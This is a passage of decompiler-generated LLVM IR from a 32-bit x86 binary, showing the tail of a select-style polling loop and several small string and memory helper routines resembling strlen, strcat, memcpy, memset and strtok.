  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804a67d, label %dec_label_pc_804a59b

dec_label_pc_804a59b:                             ; preds = %dec_label_pc_804a593
  %v0_804a59b = call i32 @function_8049188()
  %v2_804a5a0 = ptrtoint i32* %stack_var_-172 to i32
  %tmp30 = bitcast i32* %stack_var_-172 to i8*
  %v2_804a5e8 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804a62e = add i32 %v15_804a56c, 16
  br label %dec_label_pc_804a5a0

dec_label_pc_804a5a0:                             ; preds = %dec_label_pc_804a62e, %dec_label_pc_804a5c0, %dec_label_pc_804a607, %dec_label_pc_804a59b
  store i32 16, i32* %stack_var_-20, align 4
  store i32 %v2_804a5a0, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804a5b9 = call i8* @_memset(i8* %tmp30, i32 0, i32 32)
  %v0_804a5bb = load i32, i32* @ebp, align 4
  %v10_804a5bb = icmp eq i32 %v0_804a5bb, -1
  br i1 %v10_804a5bb, label %dec_label_pc_804a607, label %dec_label_pc_804a5c0

dec_label_pc_804a5c0:                             ; preds = %dec_label_pc_804a5a0
  %v2_804a5c4 = udiv i32 %v0_804a5bb, 32
  store i32 %v2_804a5c4, i32* @ebx, align 4
  %v1_804a5c7 = urem i32 %v0_804a5bb, 32
  store i32 %v1_804a5c7, i32* @edi, align 4
  %v0_804a5ca = load i32, i32* @esp, align 4
  %v2_804a5ca = mul nuw nsw i32 %v2_804a5c4, 4
  %v3_804a5ca = add nuw nsw i32 %v2_804a5ca, 16
  %v4_804a5ca = add i32 %v3_804a5ca, %v0_804a5ca
  %v5_804a5ca = inttoptr i32 %v4_804a5ca to i32*
  %v6_804a5ca = load i32, i32* %v5_804a5ca, align 4
  %v9_804a5ca = shl i32 1, %v1_804a5c7
  %v12_804a5ca = or i32 %v6_804a5ca, %v9_804a5ca
  store i32 %v12_804a5ca, i32* %v5_804a5ca, align 4
  store i32 10, i32* %stack_var_-28, align 4
  %v0_804a5f5 = load i32, i32* @ebp, align 4
  %v1_804a5f5 = add i32 %v0_804a5f5, 1
  store i32 %v1_804a5f5, i32* %stack_var_-220, align 4
  %v5_804a5f9 = call i32 @function_804b054(i32 %v1_804a5f5, i32 %v2_804a5a0, i32 0, i32 0, i32 %v2_804a5e8)
  %v1_804a601 = icmp eq i32 %v5_804a5f9, 0
  br i1 %v1_804a601, label %dec_label_pc_804a5a0, label %dec_label_pc_804a62b

dec_label_pc_804a607:                             ; preds = %dec_label_pc_804a5a0
  %v0_804a607 = load i32, i32* %stack_var_-220, align 4
  %v1_804a607 = call i32 @function_80490fc(i32 %v0_804a607)
  %v2_804a607 = sext i32 %v1_804a607 to i64
  %v11_804a618 = urem i64 %v2_804a607, 5
  %v12_804a618 = trunc i64 %v11_804a618 to i32
  %v1_804a61a = add nuw nsw i32 %v12_804a618, 5
  %v1_804a61e = call i32 @function_804c4a7(i32 %v1_804a61a)
  br label %dec_label_pc_804a5a0

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a5c0
  %v1_804a62b = add i32 %v5_804a5f9, 1
  %v8_804a62b = icmp eq i32 %v1_804a62b, 0
  store i32 %v1_804a62b, i32* @eax, align 4
  br i1 %v8_804a62b, label %dec_label_pc_804a673, label %dec_label_pc_804a62e

dec_label_pc_804a62e:                             ; preds = %dec_label_pc_804a62b
  %v1_804a62e = load i32, i32* @ebx, align 4
  %v2_804a62e = mul i32 %v1_804a62e, 4
  %v4_804a62e = add i32 %v3_804a62e, %v2_804a62e
  %v5_804a62e = inttoptr i32 %v4_804a62e to i32*
  %v6_804a62e = load i32, i32* %v5_804a62e, align 4
  %v7_804a62e = load i32, i32* @edi, align 4
  %v8_804a62e = urem i32 %v7_804a62e, 32
  %v9_804a62e = shl i32 1, %v8_804a62e
  %v10_804a62e = and i32 %v9_804a62e, %v6_804a62e
  %v11_804a62e = icmp ne i32 %v10_804a62e, 0
  %v4_804a636 = icmp eq i1 %v11_804a62e, false
  br i1 %v4_804a636, label %dec_label_pc_804a5a0, label %dec_label_pc_804a63e

dec_label_pc_804a63e:                             ; preds = %dec_label_pc_804a62e
  %v2_804a63e = ptrtoint i32* %stack_var_-44 to i32
  %v0_804a645 = load i32, i32* @esi, align 4
  %v1_804a645 = sub i32 0, %v0_804a645
  %v2_804a648 = ptrtoint i32* %stack_var_-20 to i32
  %v3_804a652 = call i32 @function_804b396(i32 %v2_804a63e, i32 %v2_804a648, i32 %v1_804a62e)
  %v0_804a657 = call i32 @function_8048513()
  %v0_804a65c = call i32 @function_804959c()
  %v0_804a661 = call i32 @function_804a554()
  %v2_804a66b = call i32 @function_804af6b(i32 %v1_804a645, i32 9)
  store i32 %v1_804a645, i32* @eax, align 4
  br label %dec_label_pc_804a676

dec_label_pc_804a673:                             ; preds = %dec_label_pc_804a62b
  br label %dec_label_pc_804a676

dec_label_pc_804a676:                             ; preds = %dec_label_pc_804a63e, %dec_label_pc_804a673
  %v1_804a678 = call i32 @function_804c440(i32 0)
  br label %dec_label_pc_804a67d

dec_label_pc_804a67d:                             ; preds = %dec_label_pc_804a593, %dec_label_pc_804a568, %dec_label_pc_804a676
  %v0_804a687 = phi i32 [ %v1_804a580, %dec_label_pc_804a593 ], [ -1, %dec_label_pc_804a568 ], [ %v1_804a678, %dec_label_pc_804a676 ]
  ret i32 %v0_804a687

; uselistorder directives
  uselistorder i32 %v1_804a645, { 1, 0 }
  uselistorder i32 %v1_804a5c7, { 1, 0 }
  uselistorder i32 %v2_804a5c4, { 1, 0 }
  uselistorder i32 %v0_804a5bb, { 1, 0, 2 }
  uselistorder i32 %v1_804a580, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32)* @function_804c4a7, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804b054, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_8049188, { 1, 0 }
  uselistorder i32 (i32)* @function_804aea2, { 1, 0 }
  uselistorder label %dec_label_pc_804a67d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a676, { 1, 0 }
  uselistorder label %dec_label_pc_804a5a0, { 0, 2, 1, 3 }
}

define i32 @function_804a688(i32 %arg1) local_unnamed_addr {
dec_label_pc_804a688:
  %v3_804a6914 = inttoptr i32 %arg1 to i8*
  %v4_804a6915 = load i8, i8* %v3_804a6914, align 1
  %v5_804a6916 = icmp eq i8 %v4_804a6915, 0
  %v1_804a6958 = icmp eq i1 %v5_804a6916, false
  br i1 %v1_804a6958, label %dec_label_pc_804a690, label %dec_label_pc_804a697

dec_label_pc_804a690:                             ; preds = %dec_label_pc_804a688, %dec_label_pc_804a690
  %v0_804a69010 = phi i32 [ %v1_804a690, %dec_label_pc_804a690 ], [ 0, %dec_label_pc_804a688 ]
  %v1_804a690 = add i32 %v0_804a69010, 1
  %v2_804a691 = add i32 %v1_804a690, %arg1
  %v3_804a691 = inttoptr i32 %v2_804a691 to i8*
  %v4_804a691 = load i8, i8* %v3_804a691, align 1
  %v5_804a691 = icmp eq i8 %v4_804a691, 0
  %v1_804a695 = icmp eq i1 %v5_804a691, false
  br i1 %v1_804a695, label %dec_label_pc_804a690, label %dec_label_pc_804a697

dec_label_pc_804a697:                             ; preds = %dec_label_pc_804a690, %dec_label_pc_804a688
  %v0_804a690.lcssa = phi i32 [ 0, %dec_label_pc_804a688 ], [ %v1_804a690, %dec_label_pc_804a690 ]
  ret i32 %v0_804a690.lcssa

; uselistorder directives
  uselistorder label %dec_label_pc_804a690, { 1, 0 }
}

define i32 @function_804a698(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804a698:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v4_804a69c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804a69c, i32* %edx.global-to-local, align 4
  %v2_804a6a34 = load i8, i8* %arg1, align 1
  %v3_804a6a35 = icmp eq i8 %v2_804a6a34, 0
  %v1_804a6a67 = icmp eq i1 %v3_804a6a35, false
  br i1 %v1_804a6a67, label %dec_label_pc_804a6a2, label %dec_label_pc_804a6a8.preheader

dec_label_pc_804a6a2:                             ; preds = %dec_label_pc_804a698, %dec_label_pc_804a6a2
  %v0_804a6a2 = phi i32 [ %v1_804a6a2, %dec_label_pc_804a6a2 ], [ %v4_804a69c, %dec_label_pc_804a698 ]
  %v1_804a6a2 = add i32 %v0_804a6a2, 1
  store i32 %v1_804a6a2, i32* %edx.global-to-local, align 4
  %v1_804a6a3 = inttoptr i32 %v1_804a6a2 to i8*
  %v2_804a6a3 = load i8, i8* %v1_804a6a3, align 1
  %v3_804a6a3 = icmp eq i8 %v2_804a6a3, 0
  %v1_804a6a6 = icmp eq i1 %v3_804a6a3, false
  br i1 %v1_804a6a6, label %dec_label_pc_804a6a2, label %dec_label_pc_804a6a8.preheader

dec_label_pc_804a6a8.preheader:                   ; preds = %dec_label_pc_804a6a2, %dec_label_pc_804a698
  %v2_804a6ab11 = phi i32 [ %v4_804a69c, %dec_label_pc_804a698 ], [ %v1_804a6a2, %dec_label_pc_804a6a2 ]
  %v4_804a6a8.pre = load i32, i32* @eax, align 4
  %v1_804a6a814 = inttoptr i32 %arg2 to i8*
  %v2_804a6a815 = load i8, i8* %v1_804a6a814, align 1
  %v3_804a6a816 = zext i8 %v2_804a6a815 to i32
  %v5_804a6a817 = and i32 %v4_804a6a8.pre, -256
  %v6_804a6a818 = or i32 %v3_804a6a816, %v5_804a6a817
  store i32 %v6_804a6a818, i32* %eax.global-to-local, align 4
  %v1_804a6aa19 = add i32 %arg2, 1
  store i32 %v1_804a6aa19, i32* @ecx, align 4
  %v3_804a6ab20 = inttoptr i32 %v2_804a6ab11 to i8*
  store i8 %v2_804a6a815, i8* %v3_804a6ab20, align 1
  %v0_804a6ad21 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a6ad22 = add i32 %v0_804a6ad21, 1
  store i32 %v1_804a6ad22, i32* %edx.global-to-local, align 4
  %v0_804a6ae23 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6ae24 = trunc i32 %v0_804a6ae23 to i8
  %v4_804a6ae25 = icmp eq i8 %v3_804a6ae24, 0
  %v1_804a6b026 = icmp eq i1 %v4_804a6ae25, false
  br i1 %v1_804a6b026, label %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge, label %dec_label_pc_804a6b2

dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge: ; preds = %dec_label_pc_804a6a8.preheader, %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge
  %v0_804a6ae28 = phi i32 [ %v0_804a6ae, %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge ], [ %v0_804a6ae23, %dec_label_pc_804a6a8.preheader ]
  %v1_804a6ad27 = phi i32 [ %v1_804a6ad, %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge ], [ %v1_804a6ad22, %dec_label_pc_804a6a8.preheader ]
  %v0_804a6a8.pre = load i32, i32* @ecx, align 4
  %v1_804a6a8 = inttoptr i32 %v0_804a6a8.pre to i8*
  %v2_804a6a8 = load i8, i8* %v1_804a6a8, align 1
  %v3_804a6a8 = zext i8 %v2_804a6a8 to i32
  %v5_804a6a8 = and i32 %v0_804a6ae28, -256
  %v6_804a6a8 = or i32 %v3_804a6a8, %v5_804a6a8
  store i32 %v6_804a6a8, i32* %eax.global-to-local, align 4
  %v1_804a6aa = add i32 %v0_804a6a8.pre, 1
  store i32 %v1_804a6aa, i32* @ecx, align 4
  %v3_804a6ab = inttoptr i32 %v1_804a6ad27 to i8*
  store i8 %v2_804a6a8, i8* %v3_804a6ab, align 1
  %v0_804a6ad = load i32, i32* %edx.global-to-local, align 4
  %v1_804a6ad = add i32 %v0_804a6ad, 1
  store i32 %v1_804a6ad, i32* %edx.global-to-local, align 4
  %v0_804a6ae = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6ae = trunc i32 %v0_804a6ae to i8
  %v4_804a6ae = icmp eq i8 %v3_804a6ae, 0
  %v1_804a6b0 = icmp eq i1 %v4_804a6ae, false
  br i1 %v1_804a6b0, label %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge, label %dec_label_pc_804a6b2

dec_label_pc_804a6b2:                             ; preds = %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge, %dec_label_pc_804a6a8.preheader
  store i32 %v4_804a69c, i32* %eax.global-to-local, align 4
  ret i32 %v4_804a69c

; uselistorder directives
  uselistorder i32 %v0_804a6ae, { 1, 0 }
  uselistorder i32 %v1_804a6ad, { 1, 0 }
  uselistorder i32 %v0_804a6a8.pre, { 1, 0 }
  uselistorder i32 %v1_804a6a2, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804a69c, { 4, 3, 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_804a6a8.dec_label_pc_804a6a8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804a6a2, { 1, 0 }
}

define i32 @function_804a6b7(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804a6b7:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a6b7 = load i32, i32* @ebx, align 4
  store i32 %v0_804a6b7, i32* %stack_var_-4, align 4
  %v1_804a6cc8 = add i32 %arg3, -1
  store i32 %v1_804a6cc8, i32* %edx.global-to-local, align 4
  %v1_804a6cd9 = add i32 %arg1, 1
  store i32 %v1_804a6cd9, i32* %ebx.global-to-local, align 4
  %v1_804a6ce10 = add i32 %arg2, 1
  store i32 %v1_804a6ce10, i32* @ecx, align 4
  %v10_804a6cf11 = icmp eq i32 %arg3, 0
  %v1_804a6d212 = icmp eq i1 %v10_804a6cf11, false
  br i1 %v1_804a6d212, label %dec_label_pc_804a6c6, label %dec_label_pc_804a6d4

dec_label_pc_804a6c6:                             ; preds = %dec_label_pc_804a6b7, %dec_label_pc_804a6c6
  %v0_804a6cd14 = phi i32 [ %v0_804a6cd.pre, %dec_label_pc_804a6c6 ], [ %arg1, %dec_label_pc_804a6b7 ]
  %v0_804a6ce13 = phi i32 [ %v0_804a6ce.pre, %dec_label_pc_804a6c6 ], [ %arg2, %dec_label_pc_804a6b7 ]
  %v2_804a6c6 = inttoptr i32 %v0_804a6ce13 to i8*
  %v3_804a6c6 = load i8, i8* %v2_804a6c6, align 1
  %v5_804a6c9 = inttoptr i32 %v0_804a6cd14 to i8*
  store i8 %v3_804a6c6, i8* %v5_804a6c9, align 1
  %v0_804a6cc.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804a6cd.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_804a6ce.pre = load i32, i32* @ecx, align 4
  %v1_804a6cc = add i32 %v0_804a6cc.pre, -1
  store i32 %v1_804a6cc, i32* %edx.global-to-local, align 4
  %v1_804a6cd = add i32 %v0_804a6cd.pre, 1
  store i32 %v1_804a6cd, i32* %ebx.global-to-local, align 4
  %v1_804a6ce = add i32 %v0_804a6ce.pre, 1
  store i32 %v1_804a6ce, i32* @ecx, align 4
  %v10_804a6cf = icmp eq i32 %v0_804a6cc.pre, 0
  %v1_804a6d2 = icmp eq i1 %v10_804a6cf, false
  br i1 %v1_804a6d2, label %dec_label_pc_804a6c6, label %dec_label_pc_804a6cc.dec_label_pc_804a6d4_crit_edge

dec_label_pc_804a6cc.dec_label_pc_804a6d4_crit_edge: ; preds = %dec_label_pc_804a6c6
  %phitmp = sext i8 %v3_804a6c6 to i32
  %v2_804a6d4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804a6d4

dec_label_pc_804a6d4:                             ; preds = %dec_label_pc_804a6cc.dec_label_pc_804a6d4_crit_edge, %dec_label_pc_804a6b7
  %v2_804a6d4 = phi i32 [ %v2_804a6d4.pre, %dec_label_pc_804a6cc.dec_label_pc_804a6d4_crit_edge ], [ %v0_804a6b7, %dec_label_pc_804a6b7 ]
  %.0.lcssa = phi i32 [ %phitmp, %dec_label_pc_804a6cc.dec_label_pc_804a6d4_crit_edge ], [ 0, %dec_label_pc_804a6b7 ]
  store i32 %v2_804a6d4, i32* @ebx, align 4
  ret i32 %.0.lcssa

; uselistorder directives
  uselistorder i32 %v0_804a6ce.pre, { 1, 0 }
  uselistorder i32 %v0_804a6cd.pre, { 1, 0 }
  uselistorder i32 %v0_804a6cc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_804a6c6, { 1, 0 }
}

define i32 @function_804a6d6(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804a6d6:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a6d6 = load i32, i32* @ebx, align 4
  store i32 %v0_804a6d6, i32* %stack_var_-4, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804a6e14 = inttoptr i32 %arg2 to i8*
  %v4_804a6e15 = load i8, i8* %v3_804a6e14, align 1
  %v5_804a6e16 = icmp eq i8 %v4_804a6e15, 0
  %v1_804a6e810 = icmp eq i1 %v5_804a6e16, false
  br i1 %v1_804a6e810, label %dec_label_pc_804a6df, label %dec_label_pc_804a6ea

dec_label_pc_804a6df:                             ; preds = %dec_label_pc_804a6d6, %dec_label_pc_804a6df
  %v1_804a6e511 = phi i32 [ %v1_804a6e5, %dec_label_pc_804a6df ], [ 1, %dec_label_pc_804a6d6 ]
  store i32 %v1_804a6e511, i32* @ebx, align 4
  %v2_804a6e1 = add i32 %v1_804a6e511, %arg2
  %v3_804a6e1 = inttoptr i32 %v2_804a6e1 to i8*
  %v4_804a6e1 = load i8, i8* %v3_804a6e1, align 1
  %v5_804a6e1 = icmp eq i8 %v4_804a6e1, 0
  %v1_804a6e5 = add i32 %v1_804a6e511, 1
  %v1_804a6e8 = icmp eq i1 %v5_804a6e1, false
  br i1 %v1_804a6e8, label %dec_label_pc_804a6df, label %dec_label_pc_804a6ea

dec_label_pc_804a6ea:                             ; preds = %dec_label_pc_804a6df, %dec_label_pc_804a6d6
  %v1_804a6e5.lcssa = phi i32 [ 1, %dec_label_pc_804a6d6 ], [ %v1_804a6e5, %dec_label_pc_804a6df ]
  %v3_804a6f0 = call i32 @function_804a6b7(i32 %arg1, i32 %arg2, i32 %v1_804a6e5.lcssa)
  %v0_804a6f8 = load i32, i32* @ebx, align 4
  %v2_804a6fa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a6fa, i32* @ebx, align 4
  ret i32 %v0_804a6f8

; uselistorder directives
  uselistorder i32 %v1_804a6e511, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804a6b7, { 1, 4, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a6df, { 1, 0 }
}

define i32 @function_804a6fc(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804a6fc:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v4_804a704 = zext i8 %arg2 to i32
  %v5_804a704 = load i32, i32* @ecx, align 4
  %v6_804a704 = and i32 %v5_804a704, -256
  %v7_804a704 = or i32 %v6_804a704, %v4_804a704
  store i32 %v7_804a704, i32* @ecx, align 4
  %v1_804a70d5 = add i32 %arg3, -1
  store i32 %v1_804a70d5, i32* %eax.global-to-local, align 4
  %v1_804a70e6 = add i32 %arg1, 1
  store i32 %v1_804a70e6, i32* %edx.global-to-local, align 4
  %v10_804a70f7 = icmp eq i32 %arg3, 0
  %v1_804a7128 = icmp eq i1 %v10_804a70f7, false
  br i1 %v1_804a7128, label %dec_label_pc_804a70a, label %dec_label_pc_804a714

dec_label_pc_804a70a:                             ; preds = %dec_label_pc_804a6fc, %dec_label_pc_804a70a.dec_label_pc_804a70a_crit_edge
  %v0_804a70a = phi i32 [ %v0_804a70a.pre, %dec_label_pc_804a70a.dec_label_pc_804a70a_crit_edge ], [ %v7_804a704, %dec_label_pc_804a6fc ]
  %v0_804a70e9 = phi i32 [ %v0_804a70e.pre, %dec_label_pc_804a70a.dec_label_pc_804a70a_crit_edge ], [ %arg1, %dec_label_pc_804a6fc ]
  %v1_804a70a = trunc i32 %v0_804a70a to i8
  %v4_804a70a = inttoptr i32 %v0_804a70e9 to i8*
  store i8 %v1_804a70a, i8* %v4_804a70a, align 1
  %v0_804a70d.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_804a70e.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804a70d = add i32 %v0_804a70d.pre, -1
  store i32 %v1_804a70d, i32* %eax.global-to-local, align 4
  %v1_804a70e = add i32 %v0_804a70e.pre, 1
  store i32 %v1_804a70e, i32* %edx.global-to-local, align 4
  %v10_804a70f = icmp eq i32 %v0_804a70d.pre, 0
  %v1_804a712 = icmp eq i1 %v10_804a70f, false
  br i1 %v1_804a712, label %dec_label_pc_804a70a.dec_label_pc_804a70a_crit_edge, label %dec_label_pc_804a714

dec_label_pc_804a70a.dec_label_pc_804a70a_crit_edge: ; preds = %dec_label_pc_804a70a
  %v0_804a70a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804a70a

dec_label_pc_804a714:                             ; preds = %dec_label_pc_804a70a, %dec_label_pc_804a6fc
  %v1_804a70d.lcssa = phi i32 [ %v1_804a70d5, %dec_label_pc_804a6fc ], [ %v1_804a70d, %dec_label_pc_804a70a ]
  ret i32 %v1_804a70d.lcssa

; uselistorder directives
  uselistorder i32 %v0_804a70e.pre, { 1, 0 }
  uselistorder i32 %v0_804a70d.pre, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a70a, { 1, 0 }
}

define i32 @function_804a715() local_unnamed_addr {
dec_label_pc_804a715:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804a716 = load i32, i32* @ebx, align 4
  store i32 %v0_804a716, i32* %stack_var_-8, align 4
  %v4_804a717 = inttoptr i32 %tmp18 to i8*
  store i32 %tmp, i32* %edx.global-to-local, align 4
  %v2_804a71f = icmp eq i32 %tmp18, 0
  store i1 %v2_804a71f, i1* %zf.global-to-local, align 1
  %v1_804a721 = icmp eq i1 %v2_804a71f, false
  br i1 %v1_804a721, label %dec_label_pc_804a727, label %dec_label_pc_804a723

dec_label_pc_804a723:                             ; preds = %dec_label_pc_804a715
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a77f

dec_label_pc_804a727:                             ; preds = %dec_label_pc_804a715
  %v1_804a727 = icmp eq i32 %tmp, 0
  store i1 %v1_804a727, i1* %zf.global-to-local, align 1
  %v1_804a729 = icmp eq i1 %v1_804a727, false
  br i1 %v1_804a729, label %dec_label_pc_804a735, label %dec_label_pc_804a72b

dec_label_pc_804a72b:                             ; preds = %dec_label_pc_804a727
  %v0_804a72b = load i8*, i8** @global_var_804f6b0.75, align 4
  %v1_804a72b = ptrtoint i8* %v0_804a72b to i32
  store i32 %v1_804a72b, i32* %edx.global-to-local, align 4
  %v1_804a731 = icmp eq i8* %v0_804a72b, null
  store i1 %v1_804a731, i1* %zf.global-to-local, align 1
  br i1 %v1_804a731, label %dec_label_pc_804a77f, label %dec_label_pc_804a735

dec_label_pc_804a735:                             ; preds = %dec_label_pc_804a72b, %dec_label_pc_804a727
  %v0_804a762 = phi i32 [ %v1_804a72b, %dec_label_pc_804a72b ], [ %tmp, %dec_label_pc_804a727 ]
  store i1 true, i1* %zf.global-to-local, align 1
  %v3_804a73a7 = inttoptr i32 %v0_804a762 to i8*
  %v4_804a73a8 = load i8, i8* %v3_804a73a7, align 1
  %v5_804a73a9 = icmp eq i8 %v4_804a73a8, 0
  store i1 %v5_804a73a9, i1* %zf.global-to-local, align 1
  %v1_804a73e11 = icmp eq i1 %v5_804a73a9, false
  br i1 %v1_804a73e11, label %dec_label_pc_804a739, label %dec_label_pc_804a740.thread

dec_label_pc_804a740.thread:                      ; preds = %dec_label_pc_804a735
  store i32 0, i32* %eax.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a775

dec_label_pc_804a739:                             ; preds = %dec_label_pc_804a735, %dec_label_pc_804a739
  %v0_804a739 = phi i32 [ %v1_804a739, %dec_label_pc_804a739 ], [ 0, %dec_label_pc_804a735 ]
  %v1_804a739 = add i32 %v0_804a739, 1
  %v8_804a739 = icmp eq i32 %v1_804a739, 0
  store i1 %v8_804a739, i1* %zf.global-to-local, align 1
  %v2_804a73a = add i32 %v1_804a739, %v0_804a762
  %v3_804a73a = inttoptr i32 %v2_804a73a to i8*
  %v4_804a73a = load i8, i8* %v3_804a73a, align 1
  %v5_804a73a = icmp eq i8 %v4_804a73a, 0
  store i1 %v5_804a73a, i1* %zf.global-to-local, align 1
  %v1_804a73e = icmp eq i1 %v5_804a73a, false
  br i1 %v1_804a73e, label %dec_label_pc_804a739, label %dec_label_pc_804a740

dec_label_pc_804a740:                             ; preds = %dec_label_pc_804a739
  store i32 0, i32* %eax.global-to-local, align 4
  %v12_804a74c22 = icmp eq i32 %v1_804a739, 0
  store i1 %v12_804a74c22, i1* %zf.global-to-local, align 1
  %v5_804a74e23 = icmp sgt i32 %v1_804a739, 0
  br i1 %v5_804a74e23, label %dec_label_pc_804a744.lr.ph, label %dec_label_pc_804a775

dec_label_pc_804a744.lr.ph:                       ; preds = %dec_label_pc_804a740
  %v6_804a744.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804a744

dec_label_pc_804a744:                             ; preds = %dec_label_pc_804a744.lr.ph, %dec_label_pc_804a74b
  %v6_804a744 = phi i32 [ %v6_804a744.pre, %dec_label_pc_804a744.lr.ph ], [ %v8_804a744, %dec_label_pc_804a74b ]
  %v1_804a76224 = phi i32 [ 0, %dec_label_pc_804a744.lr.ph ], [ %v1_804a74b, %dec_label_pc_804a74b ]
  %v2_804a744 = add i32 %v1_804a76224, %v0_804a762
  %v3_804a744 = inttoptr i32 %v2_804a744 to i8*
  %v4_804a744 = load i8, i8* %v3_804a744, align 1
  %v5_804a747 = load i8, i8* %v4_804a717, align 1
  %v16_804a747 = icmp eq i8 %v4_804a744, %v5_804a747
  store i1 %v16_804a747, i1* %zf.global-to-local, align 1
  br i1 %v16_804a747, label %dec_label_pc_804a752, label %dec_label_pc_804a74b

dec_label_pc_804a74b:                             ; preds = %dec_label_pc_804a744
  %v7_804a744 = and i32 %v6_804a744, -256
  %v5_804a744 = zext i8 %v4_804a744 to i32
  %v8_804a744 = or i32 %v7_804a744, %v5_804a744
  %v1_804a74b = add nuw nsw i32 %v1_804a76224, 1
  store i32 %v1_804a74b, i32* %eax.global-to-local, align 4
  %v12_804a74c = icmp eq i32 %v1_804a74b, %v1_804a739
  store i1 %v12_804a74c, i1* %zf.global-to-local, align 1
  %v5_804a74e = icmp slt i32 %v1_804a74b, %v1_804a739
  br i1 %v5_804a74e, label %dec_label_pc_804a744, label %dec_label_pc_804a775

dec_label_pc_804a752:                             ; preds = %dec_label_pc_804a744
  %v2_804a752 = load i8, i8* %v3_804a73a7, align 1
  %v15_804a752 = icmp eq i8 %v2_804a752, %v4_804a744
  store i1 %v15_804a752, i1* %zf.global-to-local, align 1
  %v1_804a754 = icmp eq i1 %v15_804a752, false
  br i1 %v1_804a754, label %dec_label_pc_804a762, label %dec_label_pc_804a756

dec_label_pc_804a756:                             ; preds = %dec_label_pc_804a752
  %v1_804a756 = add i32 %v0_804a762, 1
  store i32 %v1_804a756, i32* %eax.global-to-local, align 4
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v1_804a75b = inttoptr i32 %v1_804a756 to i8*
  store i8* %v1_804a75b, i8** @global_var_804f6b0.75, align 16
  br label %dec_label_pc_804a77f

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a752
  store i32 %v2_804a744, i32* %eax.global-to-local, align 4
  %v10_804a765 = icmp eq i32 %v2_804a744, -1
  store i1 %v10_804a765, i1* %zf.global-to-local, align 1
  store i8 0, i8* %v3_804a744, align 1
  %v0_804a76b = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804a76b, label %dec_label_pc_804a775, label %dec_label_pc_804a76d

dec_label_pc_804a76d:                             ; preds = %dec_label_pc_804a762
  %v0_804a76d = load i32, i32* %eax.global-to-local, align 4
  %v1_804a76d = add i32 %v0_804a76d, 1
  %v8_804a76d = icmp eq i32 %v1_804a76d, 0
  store i1 %v8_804a76d, i1* %zf.global-to-local, align 1
  store i32 %v1_804a76d, i32* %eax.global-to-local, align 4
  %v1_804a76e = inttoptr i32 %v1_804a76d to i8*
  store i8* %v1_804a76e, i8** @global_var_804f6b0.75, align 16
  br label %dec_label_pc_804a77f

dec_label_pc_804a775:                             ; preds = %dec_label_pc_804a740, %dec_label_pc_804a740.thread, %dec_label_pc_804a74b, %dec_label_pc_804a762
  store i8* null, i8** @global_var_804f6b0.75, align 16
  br label %dec_label_pc_804a77f

dec_label_pc_804a77f:                             ; preds = %dec_label_pc_804a72b, %dec_label_pc_804a76d, %dec_label_pc_804a756, %dec_label_pc_804a723, %dec_label_pc_804a775
  %v2_804a77f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804a77f, i32* @ebx, align 4
  %v0_804a780 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804a780, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a780

